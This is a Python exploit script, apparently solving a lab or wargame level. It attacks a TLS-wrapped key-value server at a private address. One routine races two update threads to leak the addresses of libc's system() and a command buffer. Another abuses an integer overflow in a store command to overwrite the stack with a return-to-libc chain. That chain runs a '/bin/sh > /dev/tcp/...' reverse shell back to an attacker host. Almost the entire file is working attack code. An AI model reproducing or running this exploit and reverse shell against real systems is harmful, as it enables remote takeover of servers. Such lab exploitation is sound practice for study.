# Imports
import socket
import struct
import time
import threading

from gnutls.crypto import *
from gnutls.connection import *

# Constants 
REMOTE_MACHINE = "192.168.56.101"
REMOTE_PORT = 20006
SHELL_COMMAND = "/bin/sh > /dev/tcp/192.168.56.1/1337 0>&1 2>&1; "

KEY_NAME = "test"
MEMORY_LEAK_OFFSET = 264
MEMORY_MAX_LEAK_OFFSET = MEMORY_LEAK_OFFSET + 0x10
POSSIBLE_LIB_VALUES = (0x740, 0x668, 0x748, 0x6e8)
SYSTEM_OFFSET = 0x11ea0

class Level(object):
	def __init__(self, ip, port):
		self.session = self.connect(ip, port)
		
		self.ip = ip
		self.port = port
		
		# Welcome message
		self.recv()
		
		self.help()
		
	def connect(self, ip, port):
		cred = X509Credentials(None, None)

		context = TLSContext(cred)
		
		s = socket.socket()
		session = ClientSession(s, context)
		
		session.connect((ip, port))
		
		session.handshake()
		
		#print dir(session)
		#raw_input()
		
		return session	
		
	def send(self, data):
		"""
		send data on the socket until all of it arrives
		
		Parameters:
			@data - string, the data to be sent
			
		Return value:
			-
		"""
		
		length_sent = 0
		data_length = len(data)
		while length_sent < data_length:
			sent = self.session.send(data)
			length_sent += sent
		
	def recv(self):
		"""
		recv data from the socket 
		
		Parameters:
			-
			
		Remarks:
			I experienced rare case conditions where this function failed.
			The workaround that was just good-enough for this exercise was 
			to restart the session
			
		Return value:
			-
		"""
		try:
			data = self.session.recv(1024)
		except Exception, e:
			time.sleep(0.5)
			self.session = self.connect(self.ip, self.port)
			data = ""

		return data
		
	def help(self):
		"""
		Implementing the internal 'h' command
		
		Parameters:
			-
			
		Return value:
			server message string
		"""
		self.send("h")
		return self.recv()
		
	def find(self, key):
		"""
		Finding key 
		
		Parameters:
			@key - string, the key to look for
			
		Return value:
			server message string
		"""
		self.send("f %s" % (key))
		return self.recv()
		
	def store(self, key, data):
		"""
		storing a new node in the dictionary structure
				
		Parameters:
			@key - string, the new key to set
			@data - string, data to write into key
			
		Return value:
			server message string
		"""
			
		# Store
		self.send("s %s %s" % (key, len(data)))
		self.send(data)
		
		return self.recv()
		
	def get(self, key):
		"""
		obtain key data from dicitonary
				
		Parameters:
			@key - string, the key to query data from
			
		Return value:
			server message string - key value if found
		"""
		
		# recv data length
		self.send("g %s" % (key))
		data_msg = self.recv()
		
		try:
			length = int(data_msg.split()[2])
		except Exception, e: # Key was not found
			return data_msg
		
		# recv data
		data = ""
		while(len(data) < length):
			d = self.recv()
			if "" == d:
				break
			data += d
			
		return data
		
	def clean(self):
		"""
		Fresh start
		
		Parameters:
			-
		Return value:
			server message string	
		"""
		self.send("X")
		return self.recv()
	
def thread_first(key, data):
	l = Level(REMOTE_MACHINE, REMOTE_PORT)
	time.sleep(1)
	
	# Update
	l.send("u %s %s" % (key, len(data)))
	l.send(data)
	
	return l.recv()
	
def thread_second(key, data):
	l = Level(REMOTE_MACHINE, REMOTE_PORT)
	
	# Begin update
	l.send("u %s %s" % (key, len(data)))
	l.send(data[:-1])
	
	# Finish update & update data length
	time.sleep(2)
	l.send(data[-1])
	
	return l.recv()
	
def overrun_object(dest_key):
	"""
	This is where the actual memory leak happens. Two threads are initialized
	to overwrite the same node, each with a different sleep time causing a 
	unique type of overwriting
	
	Parameters:
		@dest_key - string, the key to manipulate
		
	Return value:
		-
	"""
	
	# Connect and cleanup data
	l = Level(REMOTE_MACHINE, REMOTE_PORT)
	l.clean()
	
	# Initial minimal store
	data = "A" * 0x1
	l.store(dest_key, data)
	
	# Forged buffer with shellcode
	forged_buffer = "B" * 0x100
	forged_buffer = forged_buffer[:-len(SHELL_COMMAND)] + SHELL_COMMAND
	
	# First thread with forged shellcode
	t1 = threading.Thread(target=thread_first, args=[dest_key, forged_buffer])
	t1.start()
	
	# Sending a randomly big buffer to manipulate the `length` data structure variable
	t2 = threading.Thread(target=thread_second, args=[dest_key, "C" * 0x500])
	t2.start()
	
	t1.join()
	t2.join()
	
	# Required
	time.sleep(0.5)
	
	
def memory_leak_addresses():
	"""
	causing a memory leak by manipulating unprotected data structure on remote 
	server. I found that after i read the object, in certain rule set i can
	get a pretty solid memory leak showing me both the address of the system()
	function, and the address of the command i should send it. Pretty lucky
	i'd say.
	
	Parameters:
		-
		
	Return value:
		(system_address, command_address)
	"""
	# Initialize session
	l = Level(REMOTE_MACHINE, REMOTE_PORT)
	key = KEY_NAME
	
	counter = 0
	
	# Loop until proper leaked addresses are found
	while 1:
		overrun_object(key)
		data = l.get(key)
		if len(data) < MEMORY_MAX_LEAK_OFFSET:
			continue
		
		# Receive leaked addresses 
		lib_address_a, lib_address_b, command_addr_a, command_addr_b = struct.unpack("IIII", data[MEMORY_LEAK_OFFSET:MEMORY_MAX_LEAK_OFFSET])
		
		if lib_address_a != lib_address_b or command_addr_a != command_addr_b:
			print " [*] [%d] Looking for the right memory leak.\r" % (counter),
			counter += 1
			continue
		
		# Sanity possible libc values:
		if (lib_address_a & 0x0FFF) in POSSIBLE_LIB_VALUES:
			# Found
			print " [*] SUCCESS - Found leaked addresses."
			break
		else:
			print " [*] [%d] Looking for the right memory leak.\r" % (counter),
			counter += 1
			continue
	
	# Calc addresses
	system = SYSTEM_OFFSET + (lib_address_a & 0xFFFFF000)
	command = command_addr_a - len(SHELL_COMMAND)
	
	print " [*] Calculated system address: [0x%08X]." % (system)
	print " [*] Calculated command address: [0x%08X]." % (command)
	
	return system, command
	
def exploit(system_address, command_address):
	"""
	Working an integer overflow on the remote server's `gather_data` function.
	Allowing me to easily overwrite the stack if i keep the other variables 
	safe to use.
	
	Parameters:
		@system_address - int, the address of system() allowing me to 
		execute any command i like
		@command_address - int, the address of the command i'll pass to system
		
	Return value:
		-
	"""
	# Initialize and fresh start
	l = Level(REMOTE_MACHINE, REMOTE_PORT)
	l.clean()
	
	key = KEY_NAME
	
	
	
	rop_gadget = struct.pack("I", system_address)
	cmd = struct.pack("I", command_address)
	
	ebx = "\xbb" * 4
	esi = "\x55" * 4
	edi = "\x0d" * 4
	ebp = "\xFF" * 4
	
	# Exploit 
	l.send("s %s -1" % (key))
	time.sleep(0.5)
	l.send("AAAA" * 7 + struct.pack("I", 0xffffffb0) + "AAAA" * 3 + ebx + esi + edi + ebp + rop_gadget + rop_gadget + cmd + "CCCC" + "AAAA")
	
	print " [*] Exploited. Get reverse shell."
	
def main():	
	# Get leaked addresses 
	system_addr, command = memory_leak_addresses()
	
	# Run exploit 
	exploit(system_addr, command)
	
	
if "__main__" == __name__:
	main()

